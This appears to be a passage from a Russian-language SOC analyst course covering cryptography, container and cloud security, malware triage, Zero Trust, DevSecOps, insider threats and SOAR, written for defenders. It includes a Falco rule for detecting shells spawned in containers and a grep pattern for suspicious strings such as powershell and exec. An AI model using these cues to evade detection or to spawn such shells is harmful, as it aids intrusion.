  │                        │
  │<────── B = g^b mod p  │
  │                        │
  │  K = B^a mod p         │  K = A^b mod p
  │  (общий секрет!)       │  (тот же!)
  │                        │
```

**Для SOC: где шифрование мешает мониторингу:**

| Проблема | Решение |
|---------|---------|
| HTTPS-трафик непрозрачен | TLS inspection (корпоративный прокси) |
| Зашифрованные DNS (DoH/DoT) | DNS inspection на корпоративном резолвере |
| Шифрованные C2 | Анализ метаданных (JA3, SNI, тайминг, размер) |
| Encrypted exfiltration | DLP на endpoint (до шифрования) |
| Ransomware шифрует файлы | Canary files, backup, мониторинг fs-операций |

### Типичные ошибки

1. **«AES-256 невозможно взломать»** — Алгоритм — нет. Но реализация может быть уязвима (hardcoded keys, weak IV, padding oracle).
2. **«MD5 — нормальный хеш»** — MD5 уязвим к коллизиям. Для IoC подходит, для безопасности — нет. Используйте SHA-256.
3. **«Шифрование = конфиденциальность»** — Шифрование без аутентификации не защищает от подмены. Используйте AEAD (AES-GCM).

### Ключевые термины

| Термин | Значение |
|--------|----------|
| **AES** | Advanced Encryption Standard — симметричный алгоритм |
| **RSA** | Асимметричный алгоритм (Rivest-Shamir-Adleman) |
| **DH** | Diffie-Hellman — протокол обмена ключами |
| **Hash** | Однонаправленная функция (SHA-256, MD5) |
| **PKI** | Public Key Infrastructure — инфраструктура публичных ключей |
| **CA** | Certificate Authority — удостоверяющий центр |
| **AEAD** | Authenticated Encryption with Associated Data |

## Тема 24: Контейнеры и Kubernetes Security

### Зачем это знать защитнику

Контейнеры и Kubernetes стали стандартом развёртывания приложений. SOC-аналитик всё чаще сталкивается с инцидентами в контейнерной среде: container escape, cryptomining в pod, компрометация через exposed API. Без понимания контейнеров часть инфраструктуры остаётся «слепой зоной».

### Простое объяснение (аналогия)

Если виртуальная машина — это отдельная квартира с собственными стенами, полом и потолком, то контейнер — это комната в коммунальной квартире с перегородками. Перегородки (namespaces) разделяют жильцов, но они делят одну кухню (ядро). Если перегородку сломать (container escape), вы попадёте к соседям.

Kubernetes — это управляющая компания, которая решает, в какой комнате кто живёт, перезаселяет при поломке и следит за порядком.

### Как это работает

**Docker: механизмы изоляции:**

```
┌─────────────────────────────────────┐
│              Host OS (Linux Kernel)  │
│                                     │
│  ┌───────────┐  ┌───────────┐      │
│  │ Container │  │ Container │      │
│  │    A      │  │    B      │      │
│  │ [nginx]   │  │ [app]     │      │
│  │           │  │           │      │
│  │ Namespaces│  │ Namespaces│      │  PID, Network, Mount,
│  │ Cgroups   │  │ Cgroups   │      │  UTS, IPC, User
│  └───────────┘  └───────────┘      │
│                                     │
│  Общее ядро Linux!                  │
└─────────────────────────────────────┘
```

**Угрозы контейнерной среды:**

| Угроза | Описание | Детекция |
|--------|---------|---------|
| **Container Escape** | Выход из контейнера на хост | Falco: syscall мониторинг |
| **Privileged Container** | Контейнер с полным доступом к хосту | K8s audit log: privileged=true |
| **Cryptomining** | Майнер в Pod | Аномальная CPU нагрузка, stratum+tcp |
| **Exposed API** | Kubernetes API без аутентификации | Shodan, network scan |
| **Image Vulnerability** | Уязвимость в базовом образе | Trivy, Snyk Container |
| **Secrets in ENV** | Пароли в переменных окружения | OPA/Gatekeeper policies |

**Мониторинг: Falco (runtime security):**

```yaml
# Falco rule: обнаружение shell в контейнере
- rule: Shell Spawned in Container
  desc: A shell was spawned in a container
  condition: >
    container and
    spawned_process and
    proc.name in (bash, sh, zsh, dash)
  output: >
    Shell spawned in container
    (user=%user.name container=%container.name
     shell=%proc.name parent=%proc.pname)
  priority: WARNING
```

### Типичные ошибки

1. **«Контейнеры изолированы как VM»** — Контейнеры делят ядро с хостом. Container escape — реальная угроза.
2. **«Docker root = безопасно»** — Root в контейнере + volume mount + privileged = root на хосте.
3. **«latest tag — удобно»** — Непредсказуемо и невоспроизводимо. Используйте конкретные версии + сканирование.

### Ключевые термины

| Термин | Значение |
|--------|----------|
| **Namespace** | Механизм изоляции ресурсов в Linux (PID, NET, MNT) |
| **Cgroup** | Control Group — ограничение ресурсов (CPU, RAM) |
| **Pod** | Минимальная единица развёртывания в Kubernetes |
| **RBAC** | Role-Based Access Control в Kubernetes |
| **Falco** | Runtime security для контейнеров (мониторинг syscalls) |
| **Container Escape** | Выход из контейнера на хостовую ОС |

## Тема 25: Cloud Security основы

### Зачем это знать защитнику

Облачная инфраструктура (AWS, Azure, GCP) — реальность для большинства организаций. SOC-аналитик должен понимать модель разделённой ответственности, уметь читать CloudTrail / Azure Monitor логи и обнаруживать типичные cloud-мисконфигурации.

### Простое объяснение (аналогия)

Облако — это аренда квартиры вместо покупки дома. Арендодатель (AWS/Azure) отвечает за здание (физическую безопасность, электричество). Вы отвечаете за замки на дверях (IAM, firewall rules), содержимое квартиры (данные) и за то, кому даёте ключи. Проблема: многие оставляют «дверь» (S3 bucket, storage account) открытой.

### Как это работает

**Модель разделённой ответственности:**

```
┌────────────────────────────────────────────┐
│           ОТВЕТСТВЕННОСТЬ КЛИЕНТА           │
│  Данные                                     │
│  IAM (кто имеет доступ)                     │
│  Network Security (Security Groups, NSG)    │
│  OS patches (для IaaS)                      │
│  Application security                        │
│  Encryption (client-side)                    │
├────────────────────────────────────────────┤
│           ОТВЕТСТВЕННОСТЬ ПРОВАЙДЕРА        │
│  Физическая безопасность ЦОД                │
│  Сеть провайдера                            │
│  Гипервизор                                 │
│  Storage infrastructure                      │
│  Global infrastructure                       │
└────────────────────────────────────────────┘
```

**Типичные мисконфигурации:**

| Мисконфигурация | Последствие | Детекция |
|----------------|------------|---------|
| S3 bucket с public access | Утечка данных | AWS Config rules, S3 access logs |
| IAM user с ключом без MFA | Компрометация аккаунта | CloudTrail: ConsoleLogin без MFA |
| Security Group 0.0.0.0/0 :22 | SSH open to Internet | VPC Flow Logs, config audit |
| Root account без MFA | Полная компрометация | CloudTrail: root events |
| Отсутствие CloudTrail | Нет аудита | AWS Config rule |

**Логи для мониторинга:**

| Провайдер | Лог | Содержимое |
|----------|-----|-----------|
| AWS | **CloudTrail** | API-вызовы (кто, что, когда, откуда) |
| AWS | **VPC Flow Logs** | Сетевой трафик (src/dst, ports, action) |
| AWS | **GuardDuty** | Автоматические findings (ML-based) |
| Azure | **Azure Monitor** | Activity Log, Diagnostic Logs |
| Azure | **Microsoft Sentinel** | Cloud-native SIEM |
| GCP | **Cloud Audit Logs** | Admin Activity, Data Access |

### Типичные ошибки

1. **«Облако безопаснее on-prem»** — Облако может быть безопаснее, но только при правильной конфигурации. Мисконфигурация — причина №1 утечек.
2. **«Провайдер защищает мои данные»** — Нет. Shared Responsibility: данные и доступ — ваша ответственность.
3. **«CloudTrail включён по умолчанию»** — Базовый CloudTrail — да. Но Data Events (S3 object access) — нет.

### Ключевые термины

| Термин | Значение |
|--------|----------|
| **Shared Responsibility** | Модель разделённой ответственности |
| **IAM** | Identity and Access Management — управление доступом |
| **Security Group** | Виртуальный firewall для облачных ресурсов |
| **CloudTrail** | Журнал API-вызовов AWS |
| **VPC** | Virtual Private Cloud — изолированная сеть |
| **CSPM** | Cloud Security Posture Management — аудит конфигурации |

## Тема 26: Malware Analysis basics (для SOC)

### Зачем это знать защитнику

SOC-аналитик не обязан быть reverse engineer, но должен уметь провести быстрый triage подозрительного файла: определить тип, извлечь IoC (строки, домены, IP), проверить на VirusTotal и принять решение — безопасен или нет.

### Простое объяснение (аналогия)

Малварь-анализ для SOC — это как осмотр подозрительной посылки на почте. Вы не разбираете бомбу (это для EOD / reverse engineer). Вы: (1) смотрите на упаковку (тип файла), (2) просвечиваете рентгеном (strings, entropy), (3) проверяете адрес отправителя (VirusTotal, sandbox), (4) решаете: безопасно или карантин.

### Как это работает

**Static Analysis (без запуска):**

| Шаг | Инструмент | Что смотрим |
|-----|-----------|------------|
| 1. Тип файла | `file`, TrID | PE? ELF? PDF? Office? |
| 2. Хеши | `md5sum`, `sha256sum` | Проверка на VirusTotal |
| 3. Строки | `strings` | URL, IP, домены, пути, команды |
| 4. Энтропия | `diec`, `pestudio` | Высокая (>7.0) = упакован/зашифрован |
| 5. PE-заголовки | `pestudio`, `pefile` | Imports, sections, compile time |
| 6. YARA | `yara` | Проверка по правилам |

**Dynamic Analysis (с запуском в sandbox):**

| Шаг | Инструмент | Что смотрим |
|-----|-----------|------------|
| 1. Sandbox | ANY.RUN, Joe Sandbox | Поведение: файлы, реестр, сеть |
| 2. Сеть | Wireshark, FakeNet | C2 адреса, DNS-запросы |
| 3. Файловая система | ProcMon | Созданные/изменённые файлы |
| 4. Реестр | ProcMon, RegShot | Persistence через реестр |
| 5. Процессы | Process Monitor, API Monitor | Injection, новые процессы |

**Быстрый triage подозрительного файла (5 минут):**

```bash
# 1. Хеш
sha256sum suspicious.exe
# → Проверить на VirusTotal

# 2. Тип
file suspicious.exe
# → PE32 executable (GUI) Intel 80386, for MS Windows

# 3. Строки
strings suspicious.exe | grep -iE "(http|https|ftp|cmd|powershell|eval|exec)"
# → Ищем URL, команды, подозрительные строки

# 4. Entropy
python3 -c "
import math, collections
data = open('suspicious.exe','rb').read()
freq = collections.Counter(data)
entropy = -sum((c/len(data))*math.log2(c/len(data)) for c in freq.values())
print(f'Entropy: {entropy:.2f}')
# > 7.0 = вероятно упакован
"
```

### Типичные ошибки

1. **«VirusTotal 0/70 = безопасно»** — Новая малварь может быть неизвестна AV. Zero detection ≠ zero risk.
2. **«Можно запустить на рабочей машине»** — НИКОГДА. Только в изолированной sandbox или VM без сети.
3. **«Strings покажет всё»** — Если файл упакован/зашифрован, strings не покажет полезного. Нужен распаковщик или динамический анализ.

### Ключевые термины

| Термин | Значение |
|--------|----------|
| **Static Analysis** | Анализ файла без запуска |
| **Dynamic Analysis** | Анализ поведения при запуске |
| **Sandbox** | Изолированная среда для безопасного запуска |
| **Entropy** | Мера случайности данных (высокая = упаковка/шифрование) |
| **Packing** | Сжатие/обфускация исполняемого файла |
| **IoC Extraction** | Извлечение индикаторов компрометации из образца |

## Тема 27: Zero Trust архитектура

### Зачем это знать защитнику

Zero Trust меняет подход к безопасности: вместо «внутри сети = доверяем» работает принцип «никому не доверяем, всё проверяем». SOC-аналитик должен понимать, как Zero Trust влияет на архитектуру мониторинга и какие новые данные появляются для анализа.

### Простое объяснение (аналогия)

Традиционная безопасность — это замок с рвом: попал внутрь стен — ходи где хочешь. Zero Trust — это здание, где каждая дверь требует пропуск. Даже если вы уже в здании, для входа в серверную нужно показать ID, подтвердить должность и объяснить зачем. Каждый раз.

### Как это работает

**Принципы Zero Trust:**

```
┌─────────────────────────────────────┐
│         ZERO TRUST PRINCIPLES       │
│                                     │
│  1. Never Trust, Always Verify      │
│     Нет доверия по умолчанию        │
│                                     │
│  2. Least Privilege                 │
│     Минимально необходимые права    │
│                                     │
│  3. Assume Breach                   │
│     Предполагай компрометацию       │
│                                     │
│  4. Verify Explicitly               │
│     Проверяй: кто, откуда, чем,    │
│     что хочет, в каком состоянии    │
│                                     │
│  5. Microsegmentation               │
│     Изоляция каждого ресурса        │
└─────────────────────────────────────┘
```

**Zero Trust vs Traditional:**

| Аспект | Traditional | Zero Trust |
|--------|------------|-----------|
| Доверие | Внутри сети = доверяем | Никому не доверяем |
| Периметр | Firewall на границе | Каждый ресурс — периметр |
| VPN | Доступ ко всей сети | Доступ к конкретному приложению |
| Аутентификация | Один раз при входе | Постоянная проверка |
| Авторизация | По IP/сегменту | По identity + context + device |

**Для SOC: больше данных, лучшая видимость:**
- Каждый запрос к ресурсу аутентифицирован и залогирован
- Device posture (состояние устройства) доступен для анализа
- Conditional Access policies создают подробные логи
- Microsegmentation = меньше lateral movement

### Типичные ошибки

1. **«Zero Trust = убрать firewall»** — Нет. Zero Trust добавляет контроли, а не убирает существующие.
2. **«Это продукт, который можно купить»** — Zero Trust — архитектурный подход, не продукт. Реализуется через комбинацию инструментов.
3. **«Zero Trust = MFA на всё»** — MFA — один элемент. Zero Trust включает identity, device health, network, application, data protection.

### Ключевые термины

| Термин | Значение |
|--------|----------|
| **Zero Trust** | Архитектура «никому не доверяй, всё проверяй» |
| **Microsegmentation** | Изоляция на уровне приложений/сервисов |
| **ZTNA** | Zero Trust Network Access — замена VPN |
| **Conditional Access** | Политики доступа на основе контекста |
| **Device Posture** | Состояние устройства (обновления, AV, шифрование) |
| **BeyondCorp** | Модель Zero Trust от Google |

## Тема 28: DevSecOps и Secure SDLC

### Зачем это знать защитнику

Уязвимости в коде — источник большинства веб-атак. DevSecOps интегрирует безопасность в процесс разработки. SOC-аналитик должен понимать, откуда берутся уязвимости и какие инструменты помогают обнаруживать их до продакшена.

### Простое объяснение (аналогия)

Представьте строительство дома. Традиционный подход: построили дом, потом позвали инспектора, он нашёл трещины — ломаем и переделываем. DevSecOps: инспектор проверяет каждый этаж по мере строительства, и трещину находят, когда залит только один этаж — исправить дёшево.

### Как это работает

**Shift Left — безопасность на ранних этапах:**

```
Традиционный подход:
  Code → Build → Test → Deploy → [SECURITY REVIEW] → Prod
                                       ↑ Поздно и дорого!

DevSecOps (Shift Left):
  [SAST] → Code → [SCA] → Build → [DAST] → Test → [IAST] → Deploy → Prod
   ↑              ↑                ↑               ↑
   Ранние этапы = дешевле исправлять
```

**Типы сканирования:**

| Тип | Описание | Когда | Инструменты |
|-----|---------|-------|------------|
| **SAST** | Анализ исходного кода | На этапе коммита | Semgrep, SonarQube |
| **SCA** | Проверка зависимостей | На этапе сборки | Snyk, Dependabot |
| **DAST** | Тестирование работающего приложения | На этапе тестирования | OWASP ZAP, Burp Suite |
| **IAST** | Инструментирование в runtime | На этапе тестирования | Contrast Security |
| **Secret Scanning** | Поиск секретов в коде | На этапе коммита | git-secrets, truffleHog |

**Для SOC: мониторинг CI/CD pipeline:**
- Алерт на коммит секрета (API key, password) в код
- Алерт на критическую CVE в зависимости
- Мониторинг deploy'ов в продакшн
- Аудит доступа к CI/CD (кто может деплоить)

### Типичные ошибки

1. **«Security review в конце достаточно»** — Чем позже найдена уязвимость, тем дороже исправить. В продакшене — x100 дороже.
2. **«SAST решает всё»** — SAST находит паттерны в коде, но не находит логические ошибки и бизнес-уязвимости.
3. **«Dependabot = безопасные зависимости»** — Dependabot находит известные CVE, но не zero-day. И обновление может внести breaking changes.

### Ключевые термины

| Термин | Значение |
|--------|----------|
| **DevSecOps** | Интеграция безопасности в DevOps |
| **Shift Left** | Перенос проверок безопасности на ранние этапы |
| **SAST** | Static Application Security Testing |
| **DAST** | Dynamic Application Security Testing |
| **SCA** | Software Composition Analysis |
| **SDLC** | Software Development Life Cycle |

## Тема 29: Обнаружение инсайдерских угроз

### Зачем это знать защитнику

Инсайдерские угрозы — одни из самых сложных для обнаружения. Инсайдер имеет легитимный доступ, и его действия формально не отличаются от нормальных. SOC-аналитик должен знать поведенческие индикаторы и уметь использовать UEBA.

### Простое объяснение (аналогия)

Обнаружить постороннего в здании просто — у него нет пропуска. Обнаружить сотрудника, который ворует — сложнее: он приходит каждый день, у него есть ключи. Единственный способ — наблюдать за поведением: приходит в нерабочее время, копирует файлы, которые не нужны для его работы, отправляет данные на личную почту.

### Как это работает

**Типы инсайдеров:**

| Тип | Описание | Пример |
|-----|---------|--------|
| **Malicious** | Сознательно наносит вред | Увольняющийся сотрудник копирует базу клиентов |
| **Negligent** | Нарушает по незнанию | Отправил конфиденциальный файл по ошибке |
| **Compromised** | Аккаунт скомпрометирован | Фишинг → учётные данные украдены |

**Поведенческие индикаторы:**

| Индикатор | Категория | Детекция |
|----------|----------|---------|
| Вход в нерабочее время | Временной | SIEM: 4624 в 2-5 утра |
| Массовое скачивание файлов | Объёмный | DLP: >100 файлов за час |
| Доступ к нетипичным ресурсам | Паттерн | UEBA: отклонение от baseline |
| USB-устройство | Носитель | Sysmon Event 6, GPO |
| Пересылка на личную почту | Канал | Email Gateway: forwarding rules |
| Повышение привилегий | Доступ | SIEM: 4672, 4732 |

**UEBA (User and Entity Behavior Analytics):**

```
┌────────────┐     ┌───────────────────┐     ┌──────────────┐
│  Логи      │     │     UEBA Engine   │     │  Алерты      │
│  (SIEM,    │────>│                   │────>│              │
│   AD,      │     │ 1. Baseline       │     │ "Пользователь│
│   DLP,     │     │    (нормальное    │     │  X отклоняется│
│   email)   │     │    поведение)     │     │  от нормы"   │
│            │     │                   │     │              │
│            │     │ 2. Anomaly        │     │ Risk Score:  │
│            │     │    Detection      │     │ 85/100       │
│            │     │                   │     │              │
│            │     │ 3. Risk Scoring   │     │              │
│            │     │                   │     │              │
└────────────┘     └───────────────────┘     └──────────────┘
```

### Типичные ошибки

1. **«Мониторинг сотрудников — это слежка»** — При правильном оформлении (политика, уведомление) — это легитимная защита организации. Нужно согласование с юристами и HR.
2. **«DLP предотвращает все утечки»** — DLP ловит известные паттерны. Мотивированный инсайдер найдёт обходной путь (фото экрана, пересказ по телефону).
3. **«Достаточно мониторить admin-аккаунты»** — Обычный пользователь с доступом к CRM может украсть всю базу клиентов.

### Ключевые термины

| Термин | Значение |
|--------|----------|
| **Insider Threat** | Угроза от лица с легитимным доступом |
| **UEBA** | User and Entity Behavior Analytics |
| **DLP** | Data Loss Prevention — предотвращение утечек |
| **Baseline** | Нормальный паттерн поведения пользователя |
| **Risk Score** | Числовая оценка риска пользователя/сущности |
| **Exfiltration** | Вынос данных за пределы организации |

## Тема 30: Автоматизация SOC: SOAR

### Зачем это знать защитнику

SOC-аналитик обрабатывает сотни алертов в день. Многие из них рутинные: проверить IP на VirusTotal, обогатить алерт данными из AD, создать тикет. SOAR (Security Orchestration, Automation and Response) автоматизирует эту рутину, позволяя аналитику сосредоточиться на настоящих угрозах.

### Простое объяснение (аналогия)

Если SIEM — это система сигнализации, а SOC-аналитик — охранник, то SOAR — это набор автоматических действий при тревоге. Сработал датчик движения → камера поворачивается к зоне → включается запись → охраннику приходит уведомление с фото. Охранник не бежит к камере — информация уже у него. Если на фото — кошка (false positive), SOAR пометит и закроет алерт.

### Как это работает

```
АЛЕРТ из SIEM
       │
       ▼
┌──────────────────────────────────────────┐
│              SOAR PLAYBOOK               │
│                                          │
│  1. ENRICHMENT (обогащение)              │
│     ├─ IP → VirusTotal API              │
│     ├─ IP → AbuseIPDB                   │
│     ├─ User → AD query (группы, роль)   │
│     └─ Hash → VirusTotal                │
│                                          │
│  2. DECISION (решение)                   │
│     ├─ VT score > 5 → MALICIOUS        │
│     ├─ IP in known-good → CLOSE         │
│     └─ Unknown → ESCALATE to L2         │
│                                          │
│  3. RESPONSE (действие)                  │
│     ├─ Block IP on firewall             │
│     ├─ Isolate host via EDR             │
│     ├─ Create ticket in Jira            │
│     ├─ Send notification to Slack       │
│     └─ Update SIEM case                 │
│                                          │
│  4. DOCUMENTATION (документация)         │
│     └─ Автоматический отчёт             │
└──────────────────────────────────────────┘
```

**Что автоматизировать (и что НЕ автоматизировать):**

| Автоматизировать | НЕ автоматизировать |
|-----------------|-------------------|
| IoC enrichment (проверка IP/hash/domain) | Решение об увольнении сотрудника |
| Создание тикетов | Сложные IR-решения |
| Закрытие known false positives | Изоляция production-серверов |
| Email notification | Публичные коммуникации об инциденте |
| Сбор дополнительных данных | Юридические действия |
| Блокировка явно вредоносных IoC | Первичный containment критической инфраструктуры |

**Shuffle SOAR (open-source):**

Shuffle — бесплатный SOAR с визуальным конструктором playbook:
- Drag-and-drop построение workflow
- 100+ интеграций (VirusTotal, TheHive, MISP, Wazuh)
- Webhook triggers из SIEM
- Python-скрипты для кастомных действий
- Self-hosted (полный контроль)

**Метрики эффективности SOAR:**

| Метрика | Описание | Цель |
|---------|---------|------|
| **MTTR** | Mean Time To Respond | ↓ Снизить время реагирования |
| **MTTD** | Mean Time To Detect | ↓ Снизить время обнаружения |
| **Alerts auto-closed** | Процент автоматически закрытых алертов | ↑ 40-60% — хороший показатель |
| **Analyst workload** | Алерты на аналитика в день | ↓ С SOAR: 30-50 вместо 200+ |
| **Enrichment time** | Время обогащения одного алерта | ↓ С SOAR: секунды вместо минут |

### Типичные ошибки

1. **«SOAR заменяет аналитика»** — SOAR автоматизирует рутину, но решения принимает человек. SOAR без аналитика — auto-closer алертов.
2. **«Автоматизировать всё сразу»** — Начните с 5-10 самых частых рутинных действий. Постепенно расширяйте.
3. **«SOAR работает из коробки»** — Нужны playbook'и, интеграции, tuning. Каждый SOAR — проект внедрения.
4. **«Auto-block на firewall = безопасно»** — Без проверки автоматическая блокировка может заблокировать CDN Google или DNS-сервер. Нужен whitelist.

### Ключевые термины

| Термин | Значение |
|--------|----------|
| **SOAR** | Security Orchestration, Automation and Response |
| **Playbook** | Автоматизированный сценарий реагирования |
| **Enrichment** | Обогащение алерта дополнительными данными |
